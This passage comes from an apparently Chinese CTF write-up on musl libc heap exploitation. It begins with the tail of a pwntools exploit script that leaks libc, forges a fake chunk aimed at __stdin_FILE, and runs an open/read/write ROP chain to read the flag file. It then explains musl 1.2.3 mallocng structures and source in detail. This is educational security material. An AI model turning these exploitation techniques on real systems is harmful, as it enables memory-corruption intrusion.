class="string">&#x27;idx\n&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.send(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;idx:\n&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Content\n&#x27;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;A&#x27;</span>*<span class="number">0x100</span>)<span class="comment">#0 </span></span><br><span class="line">add(<span class="string">&#x27;D&#x27;</span>*<span class="number">0x100</span>)<span class="comment">#1</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>) </span><br><span class="line"></span><br><span class="line">mal = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">384</span> </span><br><span class="line">libc.address = mal-libc.sym[<span class="string">&#x27;mal&#x27;</span>] </span><br><span class="line">heap_addr=libc.address+<span class="number">0x2953c0</span></span><br><span class="line">ret = libc.address+<span class="number">0x0000000000000cdc</span></span><br><span class="line">mov_rdx = libc.address+<span class="number">0x000000000004951a</span></span><br><span class="line">pop_rdi=libc.address+<span class="number">0x0000000000014862</span></span><br><span class="line">pop_rsi=libc.address+<span class="number">0x000000000001c237</span></span><br><span class="line">pop_rdx=libc.address+<span class="number">0x000000000001bea2</span></span><br><span class="line">success(<span class="built_in">hex</span>(libc.address))</span><br><span class="line">fake_chunk = p64(mal+<span class="number">400</span>-<span class="number">0x18</span>) </span><br><span class="line">fake_chunk += p64(libc.sym[<span class="string">&#x27;__stdin_FILE&#x27;</span>]+<span class="number">0x40</span>)</span><br><span class="line">edit(<span class="number">0</span>,fake_chunk) </span><br><span class="line">payload=p64(pop_rdi)+p64(heap_addr+<span class="number">0x100</span>)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(libc.symbols[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi)+p64(heap_addr+<span class="number">0x110</span>)+p64(pop_rdx)+p64(<span class="number">0x30</span>)+p64(libc.symbols[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi)+p64(heap_addr+<span class="number">0x110</span>)+p64(pop_rdx)+p64(<span class="number">0x30</span>)+p64(libc.symbols[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=<span class="string">&#x27;./flag&#x27;</span></span><br><span class="line">add(payload)</span><br><span class="line">payload=<span class="string">&#x27;A&#x27;</span>*<span class="number">0xb0</span>+<span class="string">&#x27;B&#x27;</span>*<span class="number">0x30</span></span><br><span class="line">payload+=p64(heap_addr)+p64(ret)+p64(<span class="number">0</span>)+p64(mov_rdx)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">add(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="2-musl-1-2-3"><a href="#2-musl-1-2-3" class="headerlink" title="2.musl 1.2.3"></a>2.musl 1.2.3</h2><h3 id="2-1-结构体"><a href="#2-1-结构体" class="headerlink" title="2.1 结构体"></a>2.1 结构体</h3><p>首先借用[__sky123_](<a href="https://blog.csdn.net/qq_45323960/article/details/129800670">musl pwn__sky123_的博客-CSDN博客</a>)大佬的一张图</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/90be998727ca4b35bce52857cf1d528e.png"></p><p>个人觉得musl的堆结构体比ptmalloc的杂乱不少，如果没有图示的话就不如ptmalloc那么好理解。</p><p>按图中所示，malloc_context是musl堆结构最上层的结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PAGESIZE 4096</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> secret; <span class="comment">//一个随机数，用于检查meta的合法性</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PAGESIZE</span></span><br><span class="line">    <span class="type">size_t</span> pagesize;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">int</span> init_done;</span><br><span class="line">    <span class="type">unsigned</span> mmap_counter;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">free_meta_head</span>;</span><span class="comment">//被释放的meta结构体构成的双向链表表头</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">avail_meta</span>;</span><span class="comment">//指向空闲的meta</span></span><br><span class="line">    <span class="type">size_t</span> avail_meta_count, avail_meta_area_count, meta_alloc_shift;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">meta_area_head</span>, *<span class="title">meta_area_tail</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *avail_meta_areas;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">active</span>[48];</span><span class="comment">//可以直接参与内存分配的meta，按照meta管理的内存中chunk的大小划分为48组，按照 meta 管理的内存中 chunk 的大小划分为 48 组，每个组由 meta 形成一个 deque</span></span><br><span class="line">    <span class="type">size_t</span> usage_by_class[<span class="number">48</span>];<span class="comment">//对应大小的缓存的所有 meta 的 group 所管理的 chunk 个数</span></span><br><span class="line">    <span class="type">uint8_t</span> unmap_seq[<span class="number">32</span>], bounces[<span class="number">32</span>];</span><br><span class="line">    <span class="type">uint8_t</span> seq;</span><br><span class="line">    <span class="type">uintptr_t</span> brk;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>所谓deque，是由meta组成的双向链表</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/f9901cc700704bf8a304bd3f60c7d0d9.png" alt="deque"></p><p>48 个组中 <code>chunk</code> 大小以及 <code>malloc</code> 的 size 大小对应关系如下：</p><table><thead><tr><th>sc</th><th>chunk size</th><th>min size</th><th>max size</th></tr></thead><tbody><tr><td>0</td><td>0x10</td><td>0x0</td><td>0xc</td></tr><tr><td>1</td><td>0x20</td><td>0xd</td><td>0x1c</td></tr><tr><td>2</td><td>0x30</td><td>0x1d</td><td>0x2c</td></tr><tr><td>3</td><td>0x40</td><td>0x2d</td><td>0x3c</td></tr><tr><td>4</td><td>0x50</td><td>0x3d</td><td>0x4c</td></tr><tr><td>5</td><td>0x60</td><td>0x4d</td><td>0x5c</td></tr><tr><td>6</td><td>0x70</td><td>0x5d</td><td>0x6c</td></tr><tr><td>7</td><td>0x80</td><td>0x6d</td><td>0x7c</td></tr><tr><td>8</td><td>0x90</td><td>0x7d</td><td>0x8c</td></tr><tr><td>9</td><td>0xa0</td><td>0x8d</td><td>0x9c</td></tr><tr><td>10</td><td>0xc0</td><td>0x9d</td><td>0xbc</td></tr><tr><td>11</td><td>0xf0</td><td>0xbd</td><td>0xec</td></tr><tr><td>12</td><td>0x120</td><td>0xed</td><td>0x11c</td></tr><tr><td>13</td><td>0x140</td><td>0x11d</td><td>0x13c</td></tr><tr><td>14</td><td>0x190</td><td>0x13d</td><td>0x18c</td></tr><tr><td>15</td><td>0x1f0</td><td>0x18d</td><td>0x1ec</td></tr><tr><td>16</td><td>0x240</td><td>0x1ed</td><td>0x23c</td></tr><tr><td>17</td><td>0x2a0</td><td>0x23d</td><td>0x29c</td></tr><tr><td>18</td><td>0x320</td><td>0x29d</td><td>0x31c</td></tr><tr><td>19</td><td>0x3f0</td><td>0x31d</td><td>0x3ec</td></tr><tr><td>20</td><td>0x480</td><td>0x3ed</td><td>0x47c</td></tr><tr><td>21</td><td>0x540</td><td>0x47d</td><td>0x53c</td></tr><tr><td>22</td><td>0x660</td><td>0x53d</td><td>0x65c</td></tr><tr><td>23</td><td>0x7f0</td><td>0x65d</td><td>0x7ec</td></tr><tr><td>24</td><td>0x920</td><td>0x7ed</td><td>0x91c</td></tr><tr><td>25</td><td>0xaa0</td><td>0x91d</td><td>0xa9c</td></tr><tr><td>26</td><td>0xcc0</td><td>0xa9d</td><td>0xcbc</td></tr><tr><td>27</td><td>0xff0</td><td>0xcbd</td><td>0xfec</td></tr><tr><td>28</td><td>0x1240</td><td>0xfed</td><td>0x123c</td></tr><tr><td>29</td><td>0x1540</td><td>0x123d</td><td>0x153c</td></tr><tr><td>30</td><td>0x1990</td><td>0x153d</td><td>0x198c</td></tr><tr><td>31</td><td>0x1ff0</td><td>0x198d</td><td>0x1fec</td></tr><tr><td>32</td><td>0x2480</td><td>0x1fed</td><td>0x247c</td></tr><tr><td>33</td><td>0x2aa0</td><td>0x247d</td><td>0x2a9c</td></tr><tr><td>34</td><td>0x3320</td><td>0x2a9d</td><td>0x331c</td></tr><tr><td>35</td><td>0x3ff0</td><td>0x331d</td><td>0x3fec</td></tr><tr><td>36</td><td>0x4910</td><td>0x3fed</td><td>0x490c</td></tr><tr><td>37</td><td>0x5540</td><td>0x490d</td><td>0x553c</td></tr><tr><td>38</td><td>0x6650</td><td>0x553d</td><td>0x664c</td></tr><tr><td>39</td><td>0x7ff0</td><td>0x664d</td><td>0x7fec</td></tr><tr><td>40</td><td>0x9240</td><td>0x7fed</td><td>0x923c</td></tr><tr><td>41</td><td>0xaaa0</td><td>0x923d</td><td>0xaa9c</td></tr><tr><td>42</td><td>0xccc0</td><td>0xaa9d</td><td>0xccbc</td></tr><tr><td>43</td><td>0xfff0</td><td>0xccbd</td><td>0xffec</td></tr><tr><td>44</td><td>0x12480</td><td>0xffed</td><td>0x1247c</td></tr><tr><td>45</td><td>0x15540</td><td>0x1247d</td><td>0x1553c</td></tr><tr><td>46</td><td>0x19980</td><td>0x1553d</td><td>0x1997c</td></tr><tr><td>47</td><td>0x1fff0</td><td>0x1997d</td><td>0x1ffec</td></tr></tbody></table><p>malloc_context是一个全局变量</p><p>在malloc_context之下的结构体是meta_area结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> check;<span class="comment">//与malloc_context中的secret字段对应，用于检查合法性</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span><span class="comment">//下一个meta_area的地址，与前面 malloc_context 的 struct meta_area *meta_area_head, *meta_area_tail 一起构成单向链表，存放空闲的 meta_area ，正常使用中的 meta_area 该字段为 0</span></span><br><span class="line">    <span class="type">int</span> nslots;<span class="comment">//该 meta_area 中管理的 meta 数量，一般为固定值</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span><span class="comment">//管理的meta数组</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这个结构体用于管理一页内的所有meta。</p><p>meta_arnea之下是meta结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span><span class="comment">//构成双向链表，即前面的 deque </span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span><span class="comment">//meta 管理的 group 结构体指针</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> avail_mask, freed_mask;<span class="comment">//表示 meta 管理的 group 结构体中每个 chunk 的状态，即是否可被分配和是否已被释放，在 musl heap 中，chunk 有 可分配，释放和在使用三个状态，且每个 chunk 只能处在三个状态中的一种上。并且释放的 chunk 不能立即参与分配，只有参与分配的 chunk 不够时才会通过 try_avail 将处于释放状态的 chunk 转换为处于可分配状态。</span></span><br><span class="line">    <span class="type">uintptr_t</span> last_idx : <span class="number">5</span>;<span class="comment">//该 meta 中最后一个 chunk 的索引，也就是该 meta 管理 last_idx + 1 个 chunk</span></span><br><span class="line">    <span class="type">uintptr_t</span> freeable : <span class="number">1</span>;<span class="comment">//该 meta 中的 chunk 是否能够被释放</span></span><br><span class="line">    <span class="type">uintptr_t</span> sizeclass : <span class="number">6</span>;<span class="comment">//管理的 group 的 chunk 大小属于哪一组。是 mmap 分配，则固定为 63 。</span></span><br><span class="line">    <span class="type">uintptr_t</span> maplen : <span class="number">8</span> * <span class="keyword">sizeof</span>(<span class="type">uintptr_t</span>) - <span class="number">12</span>;<span class="comment">//如果管理的 group 是 mmap分配的，则为内存页数，否则为 0 。</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>有一个[muslheap](<a href="https://github.com/xf1les/muslheap">xf1les&#x2F;muslheap: a GDB plug-in for inspecting mallocng (github.com)</a>)的gdb插件，可以帮助我们查看musl中的结构体</p><p>使用mheapinfo查看malloc_context结构体</p><p><img src="https://pic.imgdb.cn/item/6540e9a3c458853aefe522a6.jpg"></p><p>再查看其中的meta结构体</p><p><img src="https://pic.imgdb.cn/item/6540e9efc458853aefe60a2d.jpg"></p><p>meta结构体之下是group结构体，group结构体之中保存着需要分配的内存块。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span><span class="comment">//所属的meta地址</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> active_idx : <span class="number">5</span>;<span class="comment">//5个比特，表示还有多少可用chunk</span></span><br><span class="line">    <span class="type">char</span> pad[UNIT - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> meta *) - <span class="number">1</span>];<span class="comment">//16字节对齐</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> storage[];<span class="comment">//可以分配的空间，chunk</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在musl1.2.2中并没有专门给chunk设置结构体，大致结构体如下所示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> prev_user_data[]; <span class="comment">//一般情况下，这个字节都是保留项目&#x27;\x00&#x27;</span></span><br><span class="line">    <span class="type">uint8_t</span> idx;  <span class="comment">//低5bit作为idx表示这是group中第几个chunk, 高3bit作为reserved</span></span><br><span class="line">    <span class="type">uint16_t</span> offset; <span class="comment">//与第一个chunk的偏移</span></span><br><span class="line">    <span class="type">char</span> user_data[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如下图所示，这是第一个chunk，第一个chunk的开头实际上是group结构体</p><p><img src="https://pic.imgdb.cn/item/6540f251c458853aef00c9e7.jpg"></p><p>再看到第二个chunk</p><p><img src="https://pic.imgdb.cn/item/6540f8cbc458853aef168b9c.jpg"></p><p>0x0004是当前chunk与第一个chunk的偏移量offset，当前chunk的地址减去offset*0x10就是第一个chunk的地址，当前chunk的地址为<code>0x555555603d40</code>，减去<code>4*0x10</code>正好得到第一个chunk的地址。</p><p>后面的<code>0xa1</code>转换成二进制为<code>10100001</code>，实际上只有低五位有效即00001，表示当前chunk是这个group中的第1(下标从0开始)个chunk。</p><p>整体的结构体从大到小就是<code>malloc_context-&gt;meta_area-&gt;meta-&gt;group-&gt;chunk</code></p><h3 id="2-2-源码分析"><a href="#2-2-源码分析" class="headerlink" title="2.2 源码分析"></a>2.2 源码分析</h3><h4 id="2-2-1-malloc"><a href="#2-2-1-malloc" class="headerlink" title="2.2.1 malloc"></a>2.2.1 malloc</h4><p>从malloc函数开始</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (n &gt;= MMAP_THRESHOLD) &#123;</span><br><span class="line"><span class="type">size_t</span> needed = n + IB + UNIT;</span><br><span class="line"><span class="type">void</span> *p = mmap(<span class="number">0</span>, needed, PROT_READ|PROT_WRITE,</span><br><span class="line">MAP_PRIVATE|MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (p==MAP_FAILED) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">wrlock();</span><br><span class="line">step_seq();</span><br><span class="line">g = alloc_meta();</span><br><span class="line"><span class="keyword">if</span> (!g) &#123;</span><br><span class="line">unlock();</span><br><span class="line">munmap(p, needed);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">g-&gt;mem = p;</span><br><span class="line">g-&gt;mem-&gt;meta = g;</span><br><span class="line">g-&gt;last_idx = <span class="number">0</span>;</span><br><span class="line">g-&gt;freeable = <span class="number">1</span>;</span><br><span class="line">g-&gt;sizeclass = <span class="number">63</span>;</span><br><span class="line">g-&gt;maplen = (needed+<span class="number">4095</span>)/<span class="number">4096</span>;</span><br><span class="line">g-&gt;avail_mask = g-&gt;freed_mask = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// use a global counter to cycle offset in</span></span><br><span class="line"><span class="comment">// individually-mmapped allocations.</span></span><br><span class="line">ctx.mmap_counter++;</span><br><span class="line">idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">goto</span> success;</span><br><span class="line">       ......</span><br><span class="line">       success:</span><br><span class="line">           ctr = ctx.mmap_counter;</span><br><span class="line">           unlock();</span><br><span class="line">           <span class="keyword">return</span> enframe(g, idx, n, ctr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果要申请的size大于<code>131052</code>，就直接用mmap分配内存</p><p>否则就先计算出申请的size属于哪个组，然后从malloc_context中找到对应的meta</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sc = size_to_class(n);</span><br><span class="line"></span><br><span class="line">rdlock();</span><br><span class="line">g = ctx.active[sc];</span><br></pre></td></tr></table></figure><p>然后如果需要的meta是空的话，那么就做出一些调整</p><blockquote><p>use coarse size classes initially when there are not yet any groups of desired size. this allows counts of 2 or 3 to be allocated at first rather than having to start with 7 or 5, the min counts for even size classes.</p><p>在还没有达到所需尺寸的群组时，最初使用粗略的尺寸类别。这样可以首先分配2或3的计数，而不是从7或5开始，这是偶数尺寸类别的最小计数。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">mask = g ? g-&gt;avail_mask : <span class="number">0</span>;</span><br><span class="line">first = mask&amp;-mask;</span><br><span class="line"><span class="keyword">if</span> (!first) <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (RDLOCK_IS_EXCLUSIVE || !MT)</span><br><span class="line">g-&gt;avail_mask = mask-first;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;avail_mask, mask, mask-first)!=mask)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">idx = a_ctz_32(first);</span><br><span class="line"><span class="keyword">goto</span> success;</span><br><span class="line">&#125;</span><br><span class="line">upgradelock();</span><br></pre></td></tr></table></figure><p>然后从这个meta中获取avail_mask，也就是哪些chunk是可以分配的，然后再取得可分配的第一个chunk的index，如果能成功取得就更新avail_mask，然后跳到success。</p><p>如果meta中没有可用的chunk，就调用alloc_slot获取一个有空闲chunk的meta</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">idx = alloc_slot(sc, n);</span><br><span class="line"><span class="keyword">if</span> (idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    unlock();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>alloc_slot</code>函数如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">alloc_slot</span><span class="params">(<span class="type">int</span> sc, <span class="type">size_t</span> req)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">uint32_t</span> first = try_avail(&amp;ctx.active[sc]);</span><br><span class="line"><span class="keyword">if</span> (first) <span class="keyword">return</span> a_ctz_32(first);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> alloc_group(sc, req);</span><br><span class="line"><span class="keyword">if</span> (!g) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">g-&gt;avail_mask--;</span><br><span class="line"><span class="built_in">queue</span>(&amp;ctx.active[sc], g);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//调用try_avail从active中获取一个有空闲chunk的meta；如果active中没有合适的meta，就调用alloc_group申请一个新的group，将这个group对应的meta加入到active中。</span></span><br></pre></td></tr></table></figure><p><code>try_avail</code>函数如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">uint32_t</span> <span class="title function_">try_avail</span><span class="params">(<span class="keyword">struct</span> meta **pm)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> *pm;</span><br><span class="line"><span class="type">uint32_t</span> first;</span><br><span class="line"><span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//如果pm这条meta链为空，就直接退出</span></span><br><span class="line"><span class="type">uint32_t</span> mask = m-&gt;avail_mask;<span class="comment">//得到可用的chunk的位图</span></span><br><span class="line"><span class="keyword">if</span> (!mask) &#123;</span><br><span class="line"><span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (!m-&gt;freed_mask) &#123;<span class="comment">//如果该meta既没有可用chunk也没有free的chunk，就直接将其从active的相应链中取出</span></span><br><span class="line">dequeue(pm, m);</span><br><span class="line">m = *pm;</span><br><span class="line"><span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">m = m-&gt;next;<span class="comment">//否则指向下一个meta</span></span><br><span class="line">*pm = m;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mask = m-&gt;freed_mask;<span class="comment">//得到当前meta的chunk的释放位图</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// skip fully-free group unless it&#x27;s the only one</span></span><br><span class="line"><span class="comment">// or it&#x27;s a permanently non-freeable group</span></span><br><span class="line"><span class="keyword">if</span> (mask == (<span class="number">2u</span>&lt;&lt;m-&gt;last_idx)<span class="number">-1</span> &amp;&amp; m-&gt;freeable) &#123;<span class="comment">//如果该meta的chunk全部被free了</span></span><br><span class="line">m = m-&gt;next;<span class="comment">//指向下一个meta</span></span><br><span class="line">*pm = m;</span><br><span class="line">mask = m-&gt;freed_mask;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// activate more slots in a not-fully-active group</span></span><br><span class="line"><span class="comment">// if needed, but only as a last resort. prefer using</span></span><br><span class="line"><span class="comment">// any other group with free slots. this avoids</span></span><br><span class="line"><span class="comment">// touching &amp; dirtying as-yet-unused pages.</span></span><br><span class="line">        <span class="comment">//如果当前 chunk 的 active_idx 范围内没有释放的 chunk 则尽可能选择下一个 chunk 否则根据经验扩大 active_idx 的范围，最后调用 activate_group 函数将 active_idx 范围内释放的 chunk 转换为空闲的 chunk。</span></span><br><span class="line"><span class="keyword">if</span> (!(mask &amp; ((<span class="number">2u</span>&lt;&lt;m-&gt;mem-&gt;active_idx)<span class="number">-1</span>))) &#123;</span><br><span class="line"><span class="keyword">if</span> (m-&gt;next != m) &#123;</span><br><span class="line">m = m-&gt;next;</span><br><span class="line">*pm = m;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="type">int</span> cnt = m-&gt;mem-&gt;active_idx + <span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> size = size_classes[m-&gt;sizeclass]*UNIT;</span><br><span class="line"><span class="type">int</span> span = UNIT + size*cnt;</span><br><span class="line"><span class="comment">// activate up to next 4k boundary</span></span><br><span class="line"><span class="keyword">while</span> ((span^(span+size<span class="number">-1</span>)) &lt; <span class="number">4096</span>) &#123;</span><br><span class="line">cnt++;</span><br><span class="line">span += size;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (cnt &gt; m-&gt;last_idx+<span class="number">1</span>)</span><br><span class="line">cnt = m-&gt;last_idx+<span class="number">1</span>;</span><br><span class="line">m-&gt;mem-&gt;active_idx = cnt<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">mask = activate_group(m);</span><br><span class="line">assert(mask);</span><br><span class="line">decay_bounces(m-&gt;sizeclass);</span><br><span class="line">&#125;</span><br><span class="line">first = mask&amp;-mask;</span><br><span class="line">m-&gt;avail_mask = mask-first;</span><br><span class="line"><span class="keyword">return</span> first;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在success中，调用了<code>enframe</code>函数</p><figure class="highlight c"><table><tr><td 